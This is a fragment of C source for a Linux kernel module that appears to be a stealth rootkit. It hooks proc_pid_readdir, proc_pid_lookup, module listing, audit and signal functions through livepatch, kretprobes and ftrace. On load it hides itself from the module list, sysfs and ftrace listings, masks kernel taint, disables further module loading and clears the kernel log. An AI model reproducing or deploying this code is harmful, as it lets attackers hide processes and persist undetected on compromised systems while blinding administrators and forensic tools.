		.handler        = ret_handler_sys_getpriority,
		.entry_handler  = entry_handler_sys_getpriority,
		.data_size      = 0,
                .maxactive      = 20,
	},

	{
		.kp.symbol_name = "do_sysinfo",
		.handler        = ret_handler_do_sysinfo,
		.entry_handler  = entry_handler_do_sysinfo,
		.data_size      = sizeof(struct sysinfo_data),
                .maxactive      = 20,
	},
};

struct kretprobe *rps[2] = {&krps[0], &krps[1]};

static struct klp_func funcs[] = {
	{
		.old_name = "proc_pid_readdir",
		.new_func = livepatch_proc_pid_readdir,
	}, 
	{
		.old_name = "proc_pid_lookup",
		.new_func = livepatch_proc_pid_lookup,
	}, 
	{
		.old_name = "cn_netlink_send",
		.new_func = livepatch_cn_netlink_send,
	}, 
	{
		.old_name = "__audit_bprm",
		.new_func = livepatch__audit_bprm,
	}, 
	{
		.old_name = "modules_open",
		.new_func = livepatch_modules_open,
	}, 
	{
		.old_name = "module_get_kallsym",
		.new_func = livepatch_module_get_kallsym,
	},
	{
		.old_name = "kill_pid_info",
		.new_func = livepatch_kill_pid_info,
	}, 
	{
		.old_name = "do_getpgid",
		.new_func = livepatch_do_getpgid,
	}, 
	{ }
};

static struct klp_object objs[] = {
	{
		/* name being NULL means vmlinux */
		.funcs = funcs,
	}, { }
};

static struct klp_patch patch = {
	.mod = THIS_MODULE,
	.objs = objs,
};

static int livepatch_init(void)
{
	int ret = -1;

	p_next_tgid = (struct tgid_iter (*)(struct pid_namespace *ns, struct tgid_iter iter)) 
				kallsyms_lookup_name("next_tgid");
	if (!p_next_tgid)
		return -1;

	p_ptrace_may_access = (bool (*)(struct task_struct *task, unsigned int mode)) 
				kallsyms_lookup_name("ptrace_may_access");
	if (!p_ptrace_may_access)
		return -1;

	p_proc_fill_cache = (bool (*)(struct file *file, struct dir_context *ctx,
				const char *name, unsigned int len,
				instantiate_t instantiate, struct task_struct *task, const void *ptr))
				kallsyms_lookup_name("proc_fill_cache");
	if (!p_proc_fill_cache)
		return -1;

	p_proc_pid_instantiate = (struct dentry *(*)(struct dentry * dentry,
                                   struct task_struct *task, const void *ptr))
				kallsyms_lookup_name("proc_pid_instantiate");
	if (!p_proc_pid_instantiate)
		return -1;

	p_modules = (struct list_head *)
				kallsyms_lookup_name("modules");
	if (!p_modules)
		return -1;

	p_modules_disabled = (int *)
				kallsyms_lookup_name("modules_disabled");
	if (!p_modules_disabled)
		return -1;

	p_module_flags = (char *(*)(struct module *mod, char *buf))
				kallsyms_lookup_name("module_flags");
	if (!p_module_flags)
		return -1;

	p_kallsyms_show_value = (bool (*)(const struct cred *cred))
				kallsyms_lookup_name("kallsyms_show_value");
	if (!p_kallsyms_show_value)
		return -1;

	p__start___ksymtab = (struct kernel_symbol*)
				kallsyms_lookup_name("__start___ksymtab");
	if (!p__start___ksymtab)
		return -1;

	p__stop___ksymtab = (struct kernel_symbol*)
				kallsyms_lookup_name("__stop___ksymtab");
	if (!p__stop___ksymtab)
		return -1;

	p_ddebug_remove_module = (int (*)(const char *mod_name))
				kallsyms_lookup_name("ddebug_remove_module");
	if (!p_ddebug_remove_module)
		return -1;

	p_tainted_mask = (unsigned long*)
				kallsyms_lookup_name("tainted_mask");
	if (!p_tainted_mask)
		return -1;

//#if 0
	p_ftrace_lock = (struct mutex *) kallsyms_lookup_name("ftrace_lock");
	if (!p_ftrace_lock)
		return -1;

#if 0
	p_ftrace_ops_list = (struct ftrace_ops **) kallsyms_lookup_name("ftrace_ops_list");
	if (!p_ftrace_ops_list)
		return -1;

	p_ftrace_list_end = (struct ftrace_ops *) kallsyms_lookup_name("ftrace_list_end");
	if (!p_ftrace_list_end)
		return -1;
#endif

	p_klp_find_ops = (struct klp_ops *(*)(void *old_func)) kallsyms_lookup_name("klp_find_ops");
	if (!p_klp_find_ops)
		return -1;

	p_ftrace_lookup_ip = (struct ftrace_func_entry *(*)(struct ftrace_hash *hash, unsigned long ip))
				 kallsyms_lookup_name("ftrace_lookup_ip");
	if (!p_ftrace_lookup_ip)
		return -1;

	p_ftrace_pages_start = (struct ftrace_page **)
				 kallsyms_lookup_name("ftrace_pages_start");
	if (!p_ftrace_pages_start)
		return -1;

	p_log_buf = (char **) kallsyms_lookup_name("log_buf");
	if (!p_log_buf)
		return -1;

	p_logbuf_lock = (raw_spinlock_t *) kallsyms_lookup_name("logbuf_lock");
	if (!p_logbuf_lock)
		return -1;

	p_clear_seq = (u64*) kallsyms_lookup_name("clear_seq");
	if (!p_clear_seq)
		return -1;

	p_clear_idx = (u32*) kallsyms_lookup_name("clear_idx");
	if (!p_clear_idx)
		return -1;

	p_log_next_seq = (u64*) kallsyms_lookup_name("log_next_seq");
	if (!p_log_next_seq)
		return -1;

	p_log_next_idx = (u32*) kallsyms_lookup_name("log_next_idx");
	if (!p_log_next_idx)
		return -1;

	p__printk_safe_enter = (void(*)(void)) kallsyms_lookup_name("__printk_safe_enter");
	if (!p__printk_safe_enter)
		return -1;

	p__printk_safe_exit = (void(*)(void)) kallsyms_lookup_name("__printk_safe_exit");
	if (!p__printk_safe_exit)
		return -1;

	p_name_to_int = (unsigned (*)(const struct qstr *qstr))
				 kallsyms_lookup_name("name_to_int");
	if (!p_name_to_int)
		return -1;

	p_find_task_by_pid_ns = (struct task_struct *(*)(pid_t nr, struct pid_namespace *ns))
				 kallsyms_lookup_name("find_task_by_pid_ns");
	if (!p_find_task_by_pid_ns)
		return -1;

	p_group_send_sig_info = (int (*)(int sig, struct kernel_siginfo *info, struct task_struct *p, enum pid_type type))
				 kallsyms_lookup_name("group_send_sig_info");
	if (!p_group_send_sig_info)
		return -1;

	p_find_task_by_vpid = (struct task_struct *(*)(pid_t vnr))
				 kallsyms_lookup_name("find_task_by_vpid");
	if (!p_find_task_by_vpid)
		return -1;
	
	p_security_task_getpgid = (int (*)(struct task_struct *p))
				 kallsyms_lookup_name("security_task_getpgid");
	if (!p_security_task_getpgid)
		return -1;

	p_free_uid = (void (*)(struct user_struct *up))
				 kallsyms_lookup_name("free_uid");
	if (!p_free_uid)
		return -1;

	p_tasklist_lock = (rwlock_t *) kallsyms_lookup_name("tasklist_lock");
	if (!p_tasklist_lock)
		return -1;

	p_find_user = (struct user_struct *(*)(kuid_t uid))
				 kallsyms_lookup_name("find_user");
	if (!p_find_user)
		return -1;

	p_kprobe_ftrace_ops = (struct ftrace_ops *)
				 kallsyms_lookup_name("kprobe_ftrace_ops");
	if (!p_kprobe_ftrace_ops)
		return -1;

	p_kprobe_ipmodify_ops = (struct ftrace_ops *)
				 kallsyms_lookup_name("kprobe_ipmodify_ops");
	if (!p_kprobe_ipmodify_ops)
		return -1;

	
	fh_install_hooks(hooks, ARRAY_SIZE(hooks));
	hidden_from_enabled_functions_ftrace_hooks(hooks, ARRAY_SIZE(hooks));

	save_tainted_mask();
	ret = klp_enable_patch(&patch);
	if (ret == 0) { 
		hidden_module(this_module);
		hidden_from_sys_livepatch(&patch);
		hidden_from_enabled_functions_klp(objs);
	}

	register_kretprobes(rps, 2);
	hidden_from_enabled_functions_kprobe(rps, 2);

	restore_tainted_mask();

	*p_modules_disabled = force_modules_disabled;
	clear_klog();

	return ret;
}

static void livepatch_exit(void)
{
}

module_init(livepatch_init);
module_exit(livepatch_exit);
MODULE_LICENSE("GPL");
MODULE_INFO(livepatch, "Y");
